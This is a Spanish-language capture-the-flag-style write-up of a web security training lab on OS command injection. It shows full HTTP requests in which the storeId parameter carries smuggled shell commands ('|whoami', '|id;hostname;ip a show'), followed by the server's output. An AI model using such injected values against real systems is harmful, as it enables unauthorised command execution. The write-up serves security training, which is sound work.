# Lab 1: OS command injection, simple case

Al acceder a un producto, se procede a darle clic a CHECK STOCK:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lo anterior genera la siguiente peticion:

```
POST /product/stock HTTP/2
Host: 0a750006043abf80835ce6d100cb0059.web-security-academy.net
Cookie: session=x7jL3GDG4TK5vpA17tQsykPOQbFiuwkq
Content-Length: 21
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Content-Type: application/x-www-form-urlencoded
Accept-Language: es-CO
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a750006043abf80835ce6d100cb0059.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a750006043abf80835ce6d100cb0059.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=2&storeId=1
```

La peticion previa responde asi:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

32

```

El parametro storeId es vulnerable a ataques de inyeccion de comandos:

```
POST /product/stock HTTP/2
Host: 0a750006043abf80835ce6d100cb0059.web-security-academy.net
Cookie: session=x7jL3GDG4TK5vpA17tQsykPOQbFiuwkq
Content-Length: 28
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Content-Type: application/x-www-form-urlencoded
Accept-Language: es-CO
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a750006043abf80835ce6d100cb0059.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a750006043abf80835ce6d100cb0059.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=2&storeId=1|whoami
```

Lo anterior responde asi:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-YXy9Od

```

En este punto podriamos ejecutar diferentes comandos como:

```
POST /product/stock HTTP/2
Host: 0a750006043abf80835ce6d100cb0059.web-security-academy.net
Cookie: session=x7jL3GDG4TK5vpA17tQsykPOQbFiuwkq
Content-Length: 43
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Content-Type: application/x-www-form-urlencoded
Accept-Language: es-CO
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a750006043abf80835ce6d100cb0059.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a750006043abf80835ce6d100cb0059.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=2&storeId=1|id;hostname;ip+a+show
```

Lo anterior responde:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 581

uid=12001(peter-YXy9Od) gid=12001(peter) groups=12001(peter)
9b94fabebdd2
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
402: eth0@if403: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.7/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```
